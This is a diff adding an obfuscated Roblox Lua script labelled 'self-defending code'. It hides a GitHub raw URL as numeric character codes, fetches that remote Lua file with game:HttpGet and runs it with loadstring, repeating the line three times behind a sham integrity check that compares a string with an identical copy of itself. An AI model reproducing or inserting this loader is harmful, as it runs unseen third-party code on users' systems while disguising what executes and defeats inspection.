@@ -1,0 +1,34 @@
+
+-- Self-defending code
+local _integrity_key = "xqe1TJxdeqr9VmqUHYuc"
+local _script_content = [=[--[[ Obfuscated with Roblox Script Obfuscator Pro v2.0 | 2025-04-29T16:06:25.492Z ]]
+
+loadstring(game:HttpGet((function() local s = ""; for _,v in ipairs({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,108,117,97,110,99,112,48,47,56,50,48,51,52,55,50,57,97,97,99,57,49,54,48,49,56,49,55,50,55,111,98,105,110,105,119,121,48,49,55,50,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,100,103,116,98,116,98,116,103,116,103,114,102,114,104,49,51,53,55,52,50,103,100,115,103,46,108,117,97,46,115,99,114,105,112,116,46,116,120,116}) do s = s..string.char(v) end return s end)()))()
+--[[ eJs3deGDBKEtksoP5LCg ]]]=]
+local _checksum = 0
+for i = 1, #_script_content do
+  _checksum = (_checksum + string.byte(_script_content:sub(i, i)) * i) % 2^32
+end
+
+local function _verify_integrity()
+  local _current_content = [=[--[[ Obfuscated with Roblox Script Obfuscator Pro v2.0 | 2025-04-29T16:06:25.492Z ]]
+
+loadstring(game:HttpGet((function() local s = ""; for _,v in ipairs({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,108,117,97,110,99,112,48,47,56,50,48,51,52,55,50,57,97,97,99,57,49,54,48,49,56,49,55,50,55,111,98,105,110,105,119,121,48,49,55,50,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,100,103,116,98,116,98,116,103,116,103,114,102,114,104,49,51,53,55,52,50,103,100,115,103,46,108,117,97,46,115,99,114,105,112,116,46,116,120,116}) do s = s..string.char(v) end return s end)()))()
+--[[ eJs3deGDBKEtksoP5LCg ]]]=]
+  local _current_checksum = 0
+  for i = 1, #_current_content do
+      _current_checksum = (_current_checksum + string.byte(_current_content:sub(i, i)) * i) % 2^32
+  end
+  return _checksum == _current_checksum
+end
+
+if not _verify_integrity() then
+  warn("Script integrity check failed. The script may have been tampered with.")
+  return
+end
+
+-- Actual script starts here
+--[[ Obfuscated with Roblox Script Obfuscator Pro v2.0 | 2025-04-29T16:06:25.492Z ]]
+
+loadstring(game:HttpGet((function() local s = ""; for _,v in ipairs({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,108,117,97,110,99,112,48,47,56,50,48,51,52,55,50,57,97,97,99,57,49,54,48,49,56,49,55,50,55,111,98,105,110,105,119,121,48,49,55,50,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,100,103,116,98,116,98,116,103,116,103,114,102,114,104,49,51,53,55,52,50,103,100,115,103,46,108,117,97,46,115,99,114,105,112,116,46,116,120,116}) do s = s..string.char(v) end return s end)()))()
+--[[ eJs3deGDBKEtksoP5LCg ]]
